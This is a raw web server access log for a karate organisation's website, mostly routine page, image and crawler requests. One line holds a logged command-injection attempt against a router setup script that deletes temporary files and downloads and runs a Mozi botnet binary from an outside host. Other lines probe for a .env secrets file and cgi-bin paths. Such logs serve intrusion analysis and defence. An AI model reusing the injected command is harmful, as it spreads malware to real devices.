::ffff:24.4.186.45 - - [08/Sep/2022:05:46:24 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:05:46:25 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:05:46:25 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:05:46:25 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:05:46:25 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:05:46:25 +0000] "GET /images/marin5thDan.jpeg HTTP/1.1" 200 105451 "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:05:46:25 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:05:46:25 +0000] "GET /images/tournaments/NKD8202022.jpg HTTP/1.1" 200 493189 "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:05:46:25 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:05:46:25 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:05:46:25 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:05:46:25 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:05:46:25 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:05:46:25 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:05:46:25 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:05:46:25 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.56.144.100 - - [08/Sep/2022:05:46:26 +0000] "GET / HTTP/1.1" 200 58442 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:24.56.144.100 - - [08/Sep/2022:05:46:27 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "https://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:24.56.144.100 - - [08/Sep/2022:05:46:27 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "https://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:24.56.144.100 - - [08/Sep/2022:05:46:27 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "https://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:24.56.144.100 - - [08/Sep/2022:05:46:27 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "https://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:24.56.144.100 - - [08/Sep/2022:05:46:27 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "https://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:24.56.144.100 - - [08/Sep/2022:05:46:28 +0000] "GET /images/marin5thDan.jpeg HTTP/1.1" 200 105451 "https://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:24.56.144.100 - - [08/Sep/2022:05:46:28 +0000] "GET /images/tournaments/NKD8202022.jpg HTTP/1.1" 200 493189 "https://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:24.56.144.100 - - [08/Sep/2022:05:46:28 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "https://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:24.56.144.100 - - [08/Sep/2022:05:46:28 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "https://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:24.56.144.100 - - [08/Sep/2022:05:46:28 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "https://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:24.56.144.100 - - [08/Sep/2022:05:46:28 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "https://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:24.56.144.100 - - [08/Sep/2022:05:46:28 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "https://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:24.56.144.100 - - [08/Sep/2022:05:46:28 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "https://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:24.56.144.100 - - [08/Sep/2022:05:46:28 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "https://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:24.4.186.45 - - [08/Sep/2022:05:46:28 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.56.144.100 - - [08/Sep/2022:05:46:28 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "https://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:24.56.144.100 - - [08/Sep/2022:05:46:29 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "https://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:24.56.144.100 - - [08/Sep/2022:05:46:30 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "https://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:24.56.144.100 - - [08/Sep/2022:05:46:30 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "https://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:24.56.144.100 - - [08/Sep/2022:05:46:31 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "https://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:24.56.144.100 - - [08/Sep/2022:05:46:31 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "https://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:24.4.186.45 - - [08/Sep/2022:05:46:32 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:05:46:36 +0000] "GET /images/promotions/AFSPrelimSchedule.pdf HTTP/1.1" 200 57391 "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:66.249.79.182 - - [08/Sep/2022:05:47:15 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.79.180 - - [08/Sep/2022:05:47:15 +0000] "GET / HTTP/1.1" 304 - "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:173.252.83.19 - - [08/Sep/2022:05:47:19 +0000] "GET /images/karatebook.jpg HTTP/1.1" 404 160 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:69.171.231.2 - - [08/Sep/2022:05:47:19 +0000] "GET /images/karatebook.jpg HTTP/1.1" 404 160 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:69.63.184.2 - - [08/Sep/2022:05:50:01 +0000] "GET /sdinforeg.php HTTP/1.1" 404 152 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:185.220.101.187 - - [08/Sep/2022:06:01:07 +0000] "GET / HTTP/1.1" 200 58442 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
::ffff:185.220.100.242 - - [08/Sep/2022:06:01:27 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
::ffff:142.44.137.77 - - [08/Sep/2022:06:07:08 +0000] "GET /spog/welcome HTTP/1.1" 404 151 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
::ffff:142.44.137.77 - - [08/Sep/2022:06:07:08 +0000] "GET /cgi-bin/welcome HTTP/1.1" 404 154 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
::ffff:24.4.186.45 - - [08/Sep/2022:06:09:02 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:06:09:02 +0000] "GET /js/common.js HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:06:09:02 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:06:09:02 +0000] "GET /images/tournaments/NKD8202022.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:06:09:02 +0000] "GET /images/marin5thDan.jpeg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:06:09:02 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:06:09:02 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:06:09:02 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:06:09:02 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:06:09:02 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:06:09:02 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:06:09:02 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:06:09:03 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:06:09:03 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:06:09:03 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:24.4.186.45 - - [08/Sep/2022:06:09:03 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
::ffff:192.241.219.168 - - [08/Sep/2022:06:16:19 +0000] "GET / HTTP/1.1" 200 58442 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:66.249.79.182 - - [08/Sep/2022:06:17:15 +0000] "GET / HTTP/1.1" 200 58442 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:205.210.31.24 - - [08/Sep/2022:06:26:08 +0000] "GET / HTTP/1.1" 200 58442 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:198.199.93.107 - - [08/Sep/2022:06:28:15 +0000] "GET / HTTP/1.1" 200 58442 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:205.250.128.107 - - [08/Sep/2022:06:35:11 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 200 691794 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 12; SM-N981W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
::ffff:205.250.128.107 - - [08/Sep/2022:06:35:16 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 206 1 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 12; SM-N981W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
::ffff:205.250.128.107 - - [08/Sep/2022:06:35:16 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" - - "https://www.google.com/" "Mozilla/5.0 (Linux; Android 12; SM-N981W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
::ffff:205.250.128.107 - - [08/Sep/2022:06:35:18 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 206 1 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 12; SM-N981W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
::ffff:205.250.128.107 - - [08/Sep/2022:06:35:18 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 206 650042 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 12; SM-N981W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
::ffff:205.250.128.107 - - [08/Sep/2022:06:35:22 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 206 1 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 12; SM-N981W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
::ffff:205.250.128.107 - - [08/Sep/2022:06:35:22 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 206 635929 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 12; SM-N981W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
::ffff:205.250.128.107 - - [08/Sep/2022:06:35:27 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 206 1 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 12; SM-N981W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
::ffff:205.250.128.107 - - [08/Sep/2022:06:35:27 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 206 621816 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 12; SM-N981W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
::ffff:205.250.128.107 - - [08/Sep/2022:06:35:29 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 206 1 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 12; SM-N981W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
::ffff:205.250.128.107 - - [08/Sep/2022:06:35:29 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 206 614943 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 12; SM-N981W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
::ffff:205.250.128.107 - - [08/Sep/2022:06:35:30 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 206 1 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 12; SM-N981W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
::ffff:205.250.128.107 - - [08/Sep/2022:06:35:30 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 206 612414 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 12; SM-N981W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
::ffff:223.130.29.151 - - [08/Sep/2022:06:40:50 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://223.130.29.151:59168/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::ffff:114.119.151.9 - - [08/Sep/2022:06:43:45 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:64.62.197.77 - - [08/Sep/2022:06:46:29 +0000] "GET / HTTP/1.1" 200 58442 "-" "-"
::ffff:114.119.151.9 - - [08/Sep/2022:06:48:44 +0000] "GET /index2.php/docs/TwentyGuidingPriciplesOfKarate.pdf HTTP/1.1" 404 189 "http://www.wadokikai.org/index2.php/index.php" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:114.119.152.130 - - [08/Sep/2022:06:53:44 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "https://wadokikai.org/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:64.62.197.77 - - [08/Sep/2022:06:54:06 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:114.119.152.130 - - [08/Sep/2022:06:58:44 +0000] "GET /events HTTP/1.1" 200 9364 "https://wadokikai.org/contact?s=1&ss=3" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:66.249.79.182 - - [08/Sep/2022:07:02:15 +0000] "GET /joinemail?type=blackbeltclasses HTTP/1.1" 200 8998 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:114.119.151.9 - - [08/Sep/2022:07:03:44 +0000] "GET /docs/Twenty%20guiding%20principles%20of%20Karate.pdf HTTP/1.1" 200 49483 "https://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:95.214.235.205 - - [08/Sep/2022:07:05:20 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [08/Sep/2022:07:05:20 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:198.235.24.140 - - [08/Sep/2022:07:11:24 +0000] "GET / HTTP/1.0" 200 58442 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:37.139.53.86 - - [08/Sep/2022:07:12:28 +0000] "GET / HTTP/1.0" 200 58442 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.34 Safari/537.36 Edg/83.0.478.25"
::ffff:37.139.53.86 - - [08/Sep/2022:07:12:29 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.34 Safari/537.36 Edg/83.0.478.25"
::ffff:37.139.53.86 - - [08/Sep/2022:07:12:29 +0000] "GET /?err=error HTTP/1.0" 200 58994 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.34 Safari/537.36 Edg/83.0.478.25"
